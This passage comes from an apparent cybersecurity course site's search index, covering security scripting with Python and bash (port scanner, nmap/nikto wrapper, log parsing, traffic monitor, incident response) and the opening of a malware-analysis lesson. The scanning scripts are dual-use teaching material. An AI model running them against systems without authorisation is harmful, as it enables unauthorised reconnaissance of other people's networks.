with JSON and Databases import json import sqlite3 def store_scan_results(results, db_path='scans.db'): \"\"\"Store scan results in SQLite database\"\"\" conn = sqlite3.connect(db_path) cursor = conn.cursor() # Create table cursor.execute(''' CREATE TABLE IF NOT EXISTS scans ( id INTEGER PRIMARY KEY, target TEXT, port INTEGER, service TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP ) ''') # Insert results for result in results: cursor.execute(''' INSERT INTO scans (target, port, service) VALUES (?, ?, ?) ''', (result['target'], result['port'], result['service'])) conn.commit() conn.close() def query_scans(target, db_path='scans.db'): \"\"\"Query previous scans for a target\"\"\" conn = sqlite3.connect(db_path) cursor = conn.cursor() cursor.execute(''' SELECT port, service, timestamp FROM scans WHERE target = ? ORDER BY timestamp DESC ''', (target,)) results = cursor.fetchall() conn.close() return results # Usage results = [ {'target': '192.168.1.1', 'port': 22, 'service': 'ssh'}, {'target': '192.168.1.1', 'port': 80, 'service': 'http'} ] store_scan_results(results) previous_scans = query_scans('192.168.1.1') for scan in previous_scans: print(f\"Port {scan[0]}: {scan[1]} (scanned: {scan[2]})\") Bash Scripting - Advanced Automated Vulnerability Scanner #!/bin/bash # vulnerability_scanner.sh TARGET=$1 OUTPUT_DIR=\"scan_results_$(date +%Y%m%d_%H%M%S)\" if [ -z \"$TARGET\" ]; then echo \"Usage: $0 <target>\" exit 1 fi # Create output directory mkdir -p $OUTPUT_DIR echo \"[*] Starting scan of $TARGET\" echo \"[*] Results will be saved to $OUTPUT_DIR\" # Nmap scan echo \"[*] Running Nmap scan...\" nmap -sV -sC -oN $OUTPUT_DIR/nmap_scan.txt $TARGET nmap -p- -oN $OUTPUT_DIR/nmap_full.txt $TARGET & # Nikto web scan echo \"[*] Running Nikto web scan...\" nikto -h $TARGET -o $OUTPUT_DIR/nikto_scan.txt & # SSL scan echo \"[*] Running SSL scan...\" sslscan $TARGET > $OUTPUT_DIR/ssl_scan.txt & # DNS enumeration echo \"[*] Running DNS enumeration...\" dig any $TARGET > $OUTPUT_DIR/dns_records.txt dnsrecon -d $TARGET -t std > $OUTPUT_DIR/dns_recon.txt & # Wait for background jobs wait # Summary report echo \"[*] Generating summary report...\" cat > $OUTPUT_DIR/summary.txt << EOF Vulnerability Scan Report Target: $TARGET Date: $(date) Files generated: - nmap_scan.txt: Service version detection - nmap_full.txt: Full port scan - nikto_scan.txt: Web vulnerabilities - ssl_scan.txt: SSL/TLS configuration - dns_records.txt: DNS records - dns_recon.txt: DNS reconnaissance Review each file for potential vulnerabilities. EOF echo \"[*] Scan complete! Results in $OUTPUT_DIR/\" Log Analysis Script #!/bin/bash # analyze_logs.sh LOG_FILE=\"/var/log/auth.log\" ALERT_THRESHOLD=5 echo \"=== Security Log Analysis ===\" echo # Failed login attempts echo \"[*] Failed SSH Login Attempts:\" grep \"Failed password\" $LOG_FILE | \\ awk '{print $(NF-3)}' | \\ sort | uniq -c | sort -rn | \\ while read count ip; do if [ $count -gt $ALERT_THRESHOLD ]; then echo \" ALERT: $ip - $count attempts\" else echo \" $ip - $count attempts\" fi done echo # Successful logins echo \"[*] Successful SSH Logins:\" grep \"Accepted password\" $LOG_FILE | \\ awk '{print $(NF-3), $(NF-5)}' | \\ sort | uniq -c | sort -rn | head -10 echo # New user accounts echo \"[*] New User Accounts Created:\" grep \"new user\" $LOG_FILE | tail -5 echo # Sudo usage echo \"[*] Recent Sudo Commands:\" grep \"sudo:\" $LOG_FILE | tail -10 echo # Port scans (from firewall logs) if [ -f \"/var/log/syslog\" ]; then echo \"[*] Possible Port Scans:\" grep \"IPTables-Dropped\" /var/log/syslog | \\ awk '{print $(NF-2)}' | \\ grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' | \\ sort | uniq -c | sort -rn | head -10 fi Automated Backup Script #!/bin/bash # secure_backup.sh BACKUP_SOURCE=\"/important/data\" BACKUP_DEST=\"/backup/location\" ENCRYPTION_KEY=\"/path/to/encryption.key\" RETENTION_DAYS=30 DATE=$(date +%Y%m%d_%H%M%S) BACKUP_FILE=\"backup_${DATE}.tar.gz.enc\" echo \"[*] Starting backup at $(date)\" # Create compressed archive echo \"[*] Creating archive...\" tar -czf - $BACKUP_SOURCE | \\ openssl enc -aes-256-cbc -salt -pbkdf2 \\ -pass file:$ENCRYPTION_KEY > \\ $BACKUP_DEST/$BACKUP_FILE if [ $? -eq 0 ]; then echo \"[+] Backup created: $BACKUP_FILE\" # Calculate hash sha256sum $BACKUP_DEST/$BACKUP_FILE > \\ $BACKUP_DEST/${BACKUP_FILE}.sha256 echo \"[+] Hash generated\" # Remove old backups echo \"[*] Removing backups older than $RETENTION_DAYS days...\" find $BACKUP_DEST -name \"backup_*.tar.gz.enc\" \\ -mtime +$RETENTION_DAYS -delete echo \"[+] Backup complete!\" else echo \"[!] Backup failed!\" exit 1 fi # Send notification echo \"Backup completed successfully\" | \\ mail -s \"Backup Report\" admin@example.com Python Security Tools Password Strength Checker import re import string def check_password_strength(password): \"\"\"Analyze password strength\"\"\" score = 0 feedback = [] # Length check if len(password) < 8: feedback.append(\"Password too short (minimum 8 characters)\") elif len(password) >= 12: score += 2 feedback.append(\"Good length\") else: score += 1 # Complexity checks if re.search(r'[a-z]', password): score += 1 else: feedback.append(\"Add lowercase letters\") if re.search(r'[A-Z]', password): score += 1 else: feedback.append(\"Add uppercase letters\") if re.search(r'[0-9]', password): score += 1 else: feedback.append(\"Add numbers\") if re.search(r'[!@#$%^&*(),.?\":{}|<>]', password): score += 2 feedback.append(\"Contains special characters\") else: feedback.append(\"Add special characters\") # Common patterns if re.search(r'(.)\\1{2,}', password): score -= 1 feedback.append(\"Avoid repeated characters\") if re.search(r'(123|abc|password|qwerty)', password.lower()): score -= 2 feedback.append(\"Avoid common patterns\") # Determine strength if score < 3: strength = \"Weak\" elif score < 5: strength = \"Medium\" elif score < 7: strength = \"Strong\" else: strength = \"Very Strong\" return { 'strength': strength, 'score': score, 'feedback': feedback } # Usage password = input(\"Enter password to check: \") result = check_password_strength(password) print(f\"Strength: {result['strength']} (Score: {result['score']})\") for item in result['feedback']: print(f\" - {item}\") Network Traffic Monitor from scapy.all import sniff, IP, TCP, UDP from collections import Counter import time class TrafficMonitor: def __init__(self): self.packets = [] self.start_time = time.time() self.ip_counter = Counter() self.port_counter = Counter() def packet_callback(self, packet): \"\"\"Process captured packet\"\"\" if IP in packet: src_ip = packet[IP].src dst_ip = packet[IP].dst # Count IPs self.ip_counter[src_ip] += 1 self.ip_counter[dst_ip] += 1 # Get ports if TCP in packet: self.port_counter[packet[TCP].dport] += 1 elif UDP in packet: self.port_counter[packet[UDP].dport] += 1 # Store packet info self.packets.append({ 'src': src_ip, 'dst': dst_ip, 'protocol': packet[IP].proto, 'size': len(packet) }) def start_capture(self, interface='eth0', duration=60): \"\"\"Capture packets for specified duration\"\"\" print(f\"Starting capture on {interface} for {duration} seconds...\") sniff(iface=interface, prn=self.packet_callback, timeout=duration, store=False) def analyze(self): \"\"\"Analyze captured traffic\"\"\" print(\"\\n=== Traffic Analysis ===\") print(f\"Total packets: {len(self.packets)}\") print(f\"Duration: {time.time() - self.start_time:.2f} seconds\") print(\"\\nTop 10 IPs by packet count:\") for ip, count in self.ip_counter.most_common(10): print(f\" {ip}: {count} packets\") print(\"\\nTop 10 Destination Ports:\") for port, count in self.port_counter.most_common(10): service = { 80: 'HTTP', 443: 'HTTPS', 22: 'SSH', 53: 'DNS', 25: 'SMTP', 21: 'FTP' }.get(port, 'Unknown') print(f\" {port} ({service}): {count} packets\") # Detect anomalies self.detect_anomalies() def detect_anomalies(self): \"\"\"Detect suspicious patterns\"\"\" print(\"\\n=== Anomaly Detection ===\") # Port scan detection for ip, count in self.ip_counter.items(): unique_ports = sum(1 for p in self.packets if p['src'] == ip) if unique_ports > 50: print(f\" ALERT: Possible port scan from {ip}\") # High volume avg_packets = len(self.packets) / len(self.ip_counter) for ip, count in self.ip_counter.most_common(5): if count > avg_packets * 10: print(f\" ALERT: High traffic volume from {ip}\") # Usage (requires root) # monitor = TrafficMonitor() # monitor.start_capture(interface='eth0', duration=60) # monitor.analyze() Automated Incident Response import subprocess import datetime import json class IncidentResponse: def __init__(self): self.incident_log = [] def log_action(self, action, details): \"\"\"Log incident response action\"\"\" entry = { 'timestamp': datetime.datetime.now().isoformat(), 'action': action, 'details': details } self.incident_log.append(entry) print(f\"[{entry['timestamp']}] {action}: {details}\") def block_ip(self, ip_address): \"\"\"Block malicious IP with iptables\"\"\" try: cmd = f\"sudo iptables -A INPUT -s {ip_address} -j DROP\" subprocess.run(cmd.split(), check=True) self.log_action('BLOCK_IP', f\"Blocked {ip_address}\") return True except Exception as e: self.log_action('ERROR', f\"Failed to block {ip_address}: {e}\") return False def isolate_host(self, hostname): \"\"\"Isolate compromised host\"\"\" # This would integrate with your network management system self.log_action('ISOLATE_HOST', f\"Isolated {hostname}\") # Actual implementation would vary by environment def collect_evidence(self, target): \"\"\"Collect forensic evidence\"\"\" evidence_dir = f\"evidence_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}\" subprocess.run(['mkdir', '-p', evidence_dir]) # Memory dump (if installed) try: subprocess.run(['sudo', 'dd', 'if=/dev/mem', f'of={evidence_dir}/memory.img'], timeout=300) self.log_action('COLLECT_MEMORY', f\"Memory dumped to {evidence_dir}\") except: pass # Network connections result = subprocess.run(['ss', '-tunap'], capture_output=True, text=True) with open(f'{evidence_dir}/connections.txt', 'w') as f: f.write(result.stdout) # Process list result = subprocess.run(['ps', 'aux'], capture_output=True, text=True) with open(f'{evidence_dir}/processes.txt', 'w') as f: f.write(result.stdout) self.log_action('COLLECT_EVIDENCE', f\"Evidence saved to {evidence_dir}\") return evidence_dir def notify_team(self, message): \"\"\"Send notification to security team\"\"\" # This would integrate with your notification system # Email, Slack, PagerDuty, etc. self.log_action('NOTIFY', message) def save_incident_report(self, filename='incident_report.json'): \"\"\"Save incident log to file\"\"\" with open(filename, 'w') as f: json.dump(self.incident_log, f, indent=2) print(f\"Incident report saved to {filename}\") # Usage example def respond_to_brute_force(attacking_ip): \"\"\"Automated response to brute force attack\"\"\" ir = IncidentResponse() ir.log_action('DETECT', f\"Brute force attack detected from {attacking_ip}\") # Block the attacker ir.block_ip(attacking_ip) # Collect evidence evidence_dir = ir.collect_evidence(attacking_ip) # Notify team ir.notify_team(f\"Brute force attack from {attacking_ip} blocked. \" f\"Evidence: {evidence_dir}\") # Save report ir.save_incident_report() # respond_to_brute_force('192.168.1.100') Key Takeaways Advanced scripting enables: - Automation of repetitive tasks - Faster reconnaissance and scanning - Real-time monitoring and alerting - Automated incident response - Custom security tools Best practices: - Error handling (try/except, exit codes) - Logging all actions - Input validation - Secure credential storage - Code comments and documentation - Testing before production use Remember: - Scripts are tools\u2014use responsibly - Always have permission before scanning - Test in isolated environments first - Keep scripts updated - Share knowledge with team These advanced scripting skills separate security professionals from beginners. Practice building your own tools, contribute to open-source projects, and continuously refine your automation skills. Next lesson, we'll explore malware analysis techniques and how to reverse engineer malicious code.","title":"Lesson 5.2"},{"location":"LECTURES/unit5/lesson5-2/#advanced-scripting-for-security","text":"You've learned basic scripting. Now let's level up with advanced techniques that security professionals use daily. These scripts automate reconnaissance, testing, analysis, and response\u2014saving hours of manual work.","title":"Advanced Scripting for Security"},{"location":"LECTURES/unit5/lesson5-2/#python-for-security-advanced-techniques","text":"","title":"Python for Security - Advanced Techniques"},{"location":"LECTURES/unit5/lesson5-2/#working-with-apis","text":"Most security tools and services provide APIs. Learn to interact with them.","title":"Working with APIs"},{"location":"LECTURES/unit5/lesson5-2/#http-requests-with-authentication","text":"import requests # Basic authentication response = requests.get('https://api.example.com/data', auth=('username', 'password')) # Bearer token authentication headers = {'Authorization': 'Bearer YOUR_TOKEN_HERE'} response = requests.get('https://api.example.com/data', headers=headers) # API key in header headers = {'X-API-Key': 'your-api-key'} response = requests.get('https://api.example.com/data', headers=headers) print(response.json())","title":"HTTP Requests with Authentication"},{"location":"LECTURES/unit5/lesson5-2/#virustotal-api-integration","text":"import requests import hashlib def check_file_virustotal(filepath, api_key): # Calculate file hash with open(filepath, 'rb') as f: file_hash = hashlib.sha256(f.read()).hexdigest() # Check hash on VirusTotal url = f'https://www.virustotal.com/api/v3/files/{file_hash}' headers = {'x-apikey': api_key} response = requests.get(url, headers=headers) if response.status_code == 200: data = response.json() stats = data['data']['attributes']['last_analysis_stats'] print(f\"Malicious detections: {stats['malicious']}\") print(f\"Total engines: {sum(stats.values())}\") return stats elif response.status_code == 404: print(\"File not found in VirusTotal database\") else: print(f\"Error: {response.status_code}\") return None # Usage check_file_virustotal('suspicious.exe', 'YOUR_API_KEY')","title":"VirusTotal API Integration"},{"location":"LECTURES/unit5/lesson5-2/#multithreading-for-speed","text":"Speed up network scanning: import threading import socket from queue import Queue # Thread-safe queue queue = Queue() open_ports = [] def port_scan(target, port): try: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(1) result = sock.connect_ex((target, port)) if result == 0: open_ports.append(port) print(f\"Port {port} is open\") sock.close() except: pass def worker(target): while not queue.empty(): port = queue.get() port_scan(target, port) queue.task_done() def threaded_port_scan(target, num_threads=100): # Fill queue with ports for port in range(1, 1025): queue.put(port) # Create threads threads = [] for _ in range(num_threads): thread = threading.Thread(target=worker, args=(target,)) thread.daemon = True thread.start() threads.append(thread) # Wait for completion queue.join() return sorted(open_ports) # Usage target = \"192.168.1.1\" print(f\"Scanning {target}...\") ports = threaded_port_scan(target) print(f\"Open ports: {ports}\")","title":"Multithreading for Speed"},{"location":"LECTURES/unit5/lesson5-2/#subprocess-management","text":"Execute system commands safely: import subprocess import shlex def run_command(command): \"\"\"Safely execute shell command\"\"\" try: # Split command safely args = shlex.split(command) # Run command result = subprocess.run(args, capture_output=True, text=True, timeout=30) return { 'stdout': result.stdout, 'stderr': result.stderr, 'returncode': result.returncode } except subprocess.TimeoutExpired: return {'error': 'Command timed out'} except Exception as e: return {'error': str(e)} # Usage result = run_command('nmap -sV 192.168.1.1') print(result['stdout'])","title":"Subprocess Management"},{"location":"LECTURES/unit5/lesson5-2/#regular-expressions-for-log-parsing","text":"import re from collections import Counter def parse_auth_log(logfile): \"\"\"Parse authentication log for failed logins\"\"\" failed_ips = [] # Pattern for failed SSH attempts pattern = r'Failed password for .+ from (\\d+\\.\\d+\\.\\d+\\.\\d+)' with open(logfile, 'r') as f: for line in f: match = re.search(pattern, line) if match: failed_ips.append(match.group(1)) # Count attempts per IP ip_counts = Counter(failed_ips) # IPs with more than 5 attempts suspicious = {ip: count for ip, count in ip_counts.items() if count > 5} return suspicious # Usage suspicious_ips = parse_auth_log('/var/log/auth.log') for ip, count in suspicious_ips.items(): print(f\"{ip}: {count} failed attempts\")","title":"Regular Expressions for Log Parsing"},{"location":"LECTURES/unit5/lesson5-2/#working-with-json-and-databases","text":"import json import sqlite3 def store_scan_results(results, db_path='scans.db'): \"\"\"Store scan results in SQLite database\"\"\" conn = sqlite3.connect(db_path) cursor = conn.cursor() # Create table cursor.execute(''' CREATE TABLE IF NOT EXISTS scans ( id INTEGER PRIMARY KEY, target TEXT, port INTEGER, service TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP ) ''') # Insert results for result in results: cursor.execute(''' INSERT INTO scans (target, port, service) VALUES (?, ?, ?) ''', (result['target'], result['port'], result['service'])) conn.commit() conn.close() def query_scans(target, db_path='scans.db'): \"\"\"Query previous scans for a target\"\"\" conn = sqlite3.connect(db_path) cursor = conn.cursor() cursor.execute(''' SELECT port, service, timestamp FROM scans WHERE target = ? ORDER BY timestamp DESC ''', (target,)) results = cursor.fetchall() conn.close() return results # Usage results = [ {'target': '192.168.1.1', 'port': 22, 'service': 'ssh'}, {'target': '192.168.1.1', 'port': 80, 'service': 'http'} ] store_scan_results(results) previous_scans = query_scans('192.168.1.1') for scan in previous_scans: print(f\"Port {scan[0]}: {scan[1]} (scanned: {scan[2]})\")","title":"Working with JSON and Databases"},{"location":"LECTURES/unit5/lesson5-2/#bash-scripting-advanced","text":"","title":"Bash Scripting - Advanced"},{"location":"LECTURES/unit5/lesson5-2/#automated-vulnerability-scanner","text":"#!/bin/bash # vulnerability_scanner.sh TARGET=$1 OUTPUT_DIR=\"scan_results_$(date +%Y%m%d_%H%M%S)\" if [ -z \"$TARGET\" ]; then echo \"Usage: $0 <target>\" exit 1 fi # Create output directory mkdir -p $OUTPUT_DIR echo \"[*] Starting scan of $TARGET\" echo \"[*] Results will be saved to $OUTPUT_DIR\" # Nmap scan echo \"[*] Running Nmap scan...\" nmap -sV -sC -oN $OUTPUT_DIR/nmap_scan.txt $TARGET nmap -p- -oN $OUTPUT_DIR/nmap_full.txt $TARGET & # Nikto web scan echo \"[*] Running Nikto web scan...\" nikto -h $TARGET -o $OUTPUT_DIR/nikto_scan.txt & # SSL scan echo \"[*] Running SSL scan...\" sslscan $TARGET > $OUTPUT_DIR/ssl_scan.txt & # DNS enumeration echo \"[*] Running DNS enumeration...\" dig any $TARGET > $OUTPUT_DIR/dns_records.txt dnsrecon -d $TARGET -t std > $OUTPUT_DIR/dns_recon.txt & # Wait for background jobs wait # Summary report echo \"[*] Generating summary report...\" cat > $OUTPUT_DIR/summary.txt << EOF Vulnerability Scan Report Target: $TARGET Date: $(date) Files generated: - nmap_scan.txt: Service version detection - nmap_full.txt: Full port scan - nikto_scan.txt: Web vulnerabilities - ssl_scan.txt: SSL/TLS configuration - dns_records.txt: DNS records - dns_recon.txt: DNS reconnaissance Review each file for potential vulnerabilities. EOF echo \"[*] Scan complete! Results in $OUTPUT_DIR/\"","title":"Automated Vulnerability Scanner"},{"location":"LECTURES/unit5/lesson5-2/#log-analysis-script","text":"#!/bin/bash # analyze_logs.sh LOG_FILE=\"/var/log/auth.log\" ALERT_THRESHOLD=5 echo \"=== Security Log Analysis ===\" echo # Failed login attempts echo \"[*] Failed SSH Login Attempts:\" grep \"Failed password\" $LOG_FILE | \\ awk '{print $(NF-3)}' | \\ sort | uniq -c | sort -rn | \\ while read count ip; do if [ $count -gt $ALERT_THRESHOLD ]; then echo \" ALERT: $ip - $count attempts\" else echo \" $ip - $count attempts\" fi done echo # Successful logins echo \"[*] Successful SSH Logins:\" grep \"Accepted password\" $LOG_FILE | \\ awk '{print $(NF-3), $(NF-5)}' | \\ sort | uniq -c | sort -rn | head -10 echo # New user accounts echo \"[*] New User Accounts Created:\" grep \"new user\" $LOG_FILE | tail -5 echo # Sudo usage echo \"[*] Recent Sudo Commands:\" grep \"sudo:\" $LOG_FILE | tail -10 echo # Port scans (from firewall logs) if [ -f \"/var/log/syslog\" ]; then echo \"[*] Possible Port Scans:\" grep \"IPTables-Dropped\" /var/log/syslog | \\ awk '{print $(NF-2)}' | \\ grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' | \\ sort | uniq -c | sort -rn | head -10 fi","title":"Log Analysis Script"},{"location":"LECTURES/unit5/lesson5-2/#automated-backup-script","text":"#!/bin/bash # secure_backup.sh BACKUP_SOURCE=\"/important/data\" BACKUP_DEST=\"/backup/location\" ENCRYPTION_KEY=\"/path/to/encryption.key\" RETENTION_DAYS=30 DATE=$(date +%Y%m%d_%H%M%S) BACKUP_FILE=\"backup_${DATE}.tar.gz.enc\" echo \"[*] Starting backup at $(date)\" # Create compressed archive echo \"[*] Creating archive...\" tar -czf - $BACKUP_SOURCE | \\ openssl enc -aes-256-cbc -salt -pbkdf2 \\ -pass file:$ENCRYPTION_KEY > \\ $BACKUP_DEST/$BACKUP_FILE if [ $? -eq 0 ]; then echo \"[+] Backup created: $BACKUP_FILE\" # Calculate hash sha256sum $BACKUP_DEST/$BACKUP_FILE > \\ $BACKUP_DEST/${BACKUP_FILE}.sha256 echo \"[+] Hash generated\" # Remove old backups echo \"[*] Removing backups older than $RETENTION_DAYS days...\" find $BACKUP_DEST -name \"backup_*.tar.gz.enc\" \\ -mtime +$RETENTION_DAYS -delete echo \"[+] Backup complete!\" else echo \"[!] Backup failed!\" exit 1 fi # Send notification echo \"Backup completed successfully\" | \\ mail -s \"Backup Report\" admin@example.com","title":"Automated Backup Script"},{"location":"LECTURES/unit5/lesson5-2/#python-security-tools","text":"","title":"Python Security Tools"},{"location":"LECTURES/unit5/lesson5-2/#password-strength-checker","text":"import re import string def check_password_strength(password): \"\"\"Analyze password strength\"\"\" score = 0 feedback = [] # Length check if len(password) < 8: feedback.append(\"Password too short (minimum 8 characters)\") elif len(password) >= 12: score += 2 feedback.append(\"Good length\") else: score += 1 # Complexity checks if re.search(r'[a-z]', password): score += 1 else: feedback.append(\"Add lowercase letters\") if re.search(r'[A-Z]', password): score += 1 else: feedback.append(\"Add uppercase letters\") if re.search(r'[0-9]', password): score += 1 else: feedback.append(\"Add numbers\") if re.search(r'[!@#$%^&*(),.?\":{}|<>]', password): score += 2 feedback.append(\"Contains special characters\") else: feedback.append(\"Add special characters\") # Common patterns if re.search(r'(.)\\1{2,}', password): score -= 1 feedback.append(\"Avoid repeated characters\") if re.search(r'(123|abc|password|qwerty)', password.lower()): score -= 2 feedback.append(\"Avoid common patterns\") # Determine strength if score < 3: strength = \"Weak\" elif score < 5: strength = \"Medium\" elif score < 7: strength = \"Strong\" else: strength = \"Very Strong\" return { 'strength': strength, 'score': score, 'feedback': feedback } # Usage password = input(\"Enter password to check: \") result = check_password_strength(password) print(f\"Strength: {result['strength']} (Score: {result['score']})\") for item in result['feedback']: print(f\" - {item}\")","title":"Password Strength Checker"},{"location":"LECTURES/unit5/lesson5-2/#network-traffic-monitor","text":"from scapy.all import sniff, IP, TCP, UDP from collections import Counter import time class TrafficMonitor: def __init__(self): self.packets = [] self.start_time = time.time() self.ip_counter = Counter() self.port_counter = Counter() def packet_callback(self, packet): \"\"\"Process captured packet\"\"\" if IP in packet: src_ip = packet[IP].src dst_ip = packet[IP].dst # Count IPs self.ip_counter[src_ip] += 1 self.ip_counter[dst_ip] += 1 # Get ports if TCP in packet: self.port_counter[packet[TCP].dport] += 1 elif UDP in packet: self.port_counter[packet[UDP].dport] += 1 # Store packet info self.packets.append({ 'src': src_ip, 'dst': dst_ip, 'protocol': packet[IP].proto, 'size': len(packet) }) def start_capture(self, interface='eth0', duration=60): \"\"\"Capture packets for specified duration\"\"\" print(f\"Starting capture on {interface} for {duration} seconds...\") sniff(iface=interface, prn=self.packet_callback, timeout=duration, store=False) def analyze(self): \"\"\"Analyze captured traffic\"\"\" print(\"\\n=== Traffic Analysis ===\") print(f\"Total packets: {len(self.packets)}\") print(f\"Duration: {time.time() - self.start_time:.2f} seconds\") print(\"\\nTop 10 IPs by packet count:\") for ip, count in self.ip_counter.most_common(10): print(f\" {ip}: {count} packets\") print(\"\\nTop 10 Destination Ports:\") for port, count in self.port_counter.most_common(10): service = { 80: 'HTTP', 443: 'HTTPS', 22: 'SSH', 53: 'DNS', 25: 'SMTP', 21: 'FTP' }.get(port, 'Unknown') print(f\" {port} ({service}): {count} packets\") # Detect anomalies self.detect_anomalies() def detect_anomalies(self): \"\"\"Detect suspicious patterns\"\"\" print(\"\\n=== Anomaly Detection ===\") # Port scan detection for ip, count in self.ip_counter.items(): unique_ports = sum(1 for p in self.packets if p['src'] == ip) if unique_ports > 50: print(f\" ALERT: Possible port scan from {ip}\") # High volume avg_packets = len(self.packets) / len(self.ip_counter) for ip, count in self.ip_counter.most_common(5): if count > avg_packets * 10: print(f\" ALERT: High traffic volume from {ip}\") # Usage (requires root) # monitor = TrafficMonitor() # monitor.start_capture(interface='eth0', duration=60) # monitor.analyze()","title":"Network Traffic Monitor"},{"location":"LECTURES/unit5/lesson5-2/#automated-incident-response","text":"import subprocess import datetime import json class IncidentResponse: def __init__(self): self.incident_log = [] def log_action(self, action, details): \"\"\"Log incident response action\"\"\" entry = { 'timestamp': datetime.datetime.now().isoformat(), 'action': action, 'details': details } self.incident_log.append(entry) print(f\"[{entry['timestamp']}] {action}: {details}\") def block_ip(self, ip_address): \"\"\"Block malicious IP with iptables\"\"\" try: cmd = f\"sudo iptables -A INPUT -s {ip_address} -j DROP\" subprocess.run(cmd.split(), check=True) self.log_action('BLOCK_IP', f\"Blocked {ip_address}\") return True except Exception as e: self.log_action('ERROR', f\"Failed to block {ip_address}: {e}\") return False def isolate_host(self, hostname): \"\"\"Isolate compromised host\"\"\" # This would integrate with your network management system self.log_action('ISOLATE_HOST', f\"Isolated {hostname}\") # Actual implementation would vary by environment def collect_evidence(self, target): \"\"\"Collect forensic evidence\"\"\" evidence_dir = f\"evidence_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}\" subprocess.run(['mkdir', '-p', evidence_dir]) # Memory dump (if installed) try: subprocess.run(['sudo', 'dd', 'if=/dev/mem', f'of={evidence_dir}/memory.img'], timeout=300) self.log_action('COLLECT_MEMORY', f\"Memory dumped to {evidence_dir}\") except: pass # Network connections result = subprocess.run(['ss', '-tunap'], capture_output=True, text=True) with open(f'{evidence_dir}/connections.txt', 'w') as f: f.write(result.stdout) # Process list result = subprocess.run(['ps', 'aux'], capture_output=True, text=True) with open(f'{evidence_dir}/processes.txt', 'w') as f: f.write(result.stdout) self.log_action('COLLECT_EVIDENCE', f\"Evidence saved to {evidence_dir}\") return evidence_dir def notify_team(self, message): \"\"\"Send notification to security team\"\"\" # This would integrate with your notification system # Email, Slack, PagerDuty, etc. self.log_action('NOTIFY', message) def save_incident_report(self, filename='incident_report.json'): \"\"\"Save incident log to file\"\"\" with open(filename, 'w') as f: json.dump(self.incident_log, f, indent=2) print(f\"Incident report saved to {filename}\") # Usage example def respond_to_brute_force(attacking_ip): \"\"\"Automated response to brute force attack\"\"\" ir = IncidentResponse() ir.log_action('DETECT', f\"Brute force attack detected from {attacking_ip}\") # Block the attacker ir.block_ip(attacking_ip) # Collect evidence evidence_dir = ir.collect_evidence(attacking_ip) # Notify team ir.notify_team(f\"Brute force attack from {attacking_ip} blocked. \" f\"Evidence: {evidence_dir}\") # Save report ir.save_incident_report() # respond_to_brute_force('192.168.1.100')","title":"Automated Incident Response"},{"location":"LECTURES/unit5/lesson5-2/#key-takeaways","text":"Advanced scripting enables: - Automation of repetitive tasks - Faster reconnaissance and scanning - Real-time monitoring and alerting - Automated incident response - Custom security tools Best practices: - Error handling (try/except, exit codes) - Logging all actions - Input validation - Secure credential storage - Code comments and documentation - Testing before production use Remember: - Scripts are tools\u2014use responsibly - Always have permission before scanning - Test in isolated environments first - Keep scripts updated - Share knowledge with team These advanced scripting skills separate security professionals from beginners. Practice building your own tools, contribute to open-source projects, and continuously refine your automation skills. Next lesson, we'll explore malware analysis techniques and how to reverse engineer malicious code.","title":"Key Takeaways"},{"location":"LECTURES/unit5/lesson5-3/","text":"Malware Analysis Fundamentals Understanding malware is critical for defense. This lesson teaches you how to safely analyze malicious software to understand its behavior, capabilities, and how to detect it. Safety First NEVER analyze malware on your main system! Safe Analysis Environment Requirements: 1. Isolated VM : No network access to your main network 2. Snapshots : Take snapshot before analysis, revert after 3. Network isolation : Host-only or isolated network 4. Monitoring tools : Process monitor, network monitor, API monitor 5. Backups : Everything backed up before starting Recommended setup: Host Machine (Your computer) \u2193 Virtual Machine (Isolated) \u251c\u2500 No shared folders \u251c\u2500 No clipboard sharing \u251c\u2500 Host-only network (optional) \u2514\u2500 Snapshot before analysis Tools for analysis VM: - Windows 10 (most malware targets Windows) - REMnux (Linux distro for malware analysis) - FLARE VM (Windows malware analysis distribution) Types of Malware Analysis Static Analysis Examine without executing. Basic static analysis: - File properties (size, type, creation date) - Strings extraction - PE header analysis - Hash calculation - VirusTotal lookup Advanced static analysis: - Disassembly - Decompilation - Code analysis - Signature creation Dynamic Analysis Execute and observe behavior. What to monitor: - File system changes - Registry modifications - Network connections - Process creation - API calls - Memory modifications Hybrid Analysis Combination of static and dynamic. - Static analysis first (safer) - Dynamic analysis to confirm findings - Iterative process Static Analysis Tools and Techniques File Identification # File type file suspicious.exe # Calculate hashes md5sum suspicious.exe sha1sum suspicious.exe sha256sum suspicious.exe # Detailed file info exiftool suspicious.exe Strings Analysis # Extract strings (minimum 8 characters) strings -n 8 suspicious.exe > strings.txt # Look for interesting strings grep -i \"http\" strings.txt grep -i \"password\" strings.txt grep -i \"\\.exe\" strings.txt grep -i \"cmd\" strings.txt # Unicode strings strings -el suspicious.exe What to look for: - URLs and IP addresses - File paths - Registry keys - Function names - Error messages - Embedded files - Encryption keys PE Header Analysis Use PEview, PE-bear, or pestudio: Important sections: - Import table : What DLLs/functions it uses - Export table : Functions it provides - Resources : Embedded files, icons - Sections : Code, data, resources Suspicious indicators: - Unusual entry point - Packed/compressed sections (high entropy) - Suspicious imports (network, process manipulation) - Modified timestamps - Unusual section names Detecting Packers Packers compress/encrypt malware to evade detection. # Detect packer upx -t suspicious.exe # Check if UPX packed # Entropy analysis (high entropy = packed/encrypted) # Use pe-studio or similar tool Common packers: - UPX - ASPack - PECompact - Themida - VMProtect Unpacking: - Some packers can be reversed (UPX: upx -d file.exe ) - Others require manual unpacking or debugging Dynamic Analysis Tools Process Monitor (Procmon) Windows Sysinternals tool - essential for dynamic analysis. Setup filters: Process Name is malware.exe Operation begins with Write Path contains HKCU\\Software What to monitor: - File operations (Create, Write, Delete) - Registry operations (RegSetValue, RegCreateKey) - Network operations (TCP/UDP connects) - Process operations (Process Create, Thread Create) Common malware behaviors: - Creating files in Temp or AppData - Modifying Run keys (persistence) - Modifying firewall settings - Dropping additional files - Injecting into other processes Process Explorer View running processes and their properties: - Memory usage - Handles (files, registry keys open) - DLLs loaded - Network connections - Strings in memory Suspicious indicators: - Unsigned executables - Unusual parent-child relationships - Process injection - Hidden processes Wireshark / tcpdump Monitor network traffic: # Capture all traffic sudo tcpdump -i any -w malware_traffic.pcap # In Wireshark: # - Filter by malware's IP # - Look for 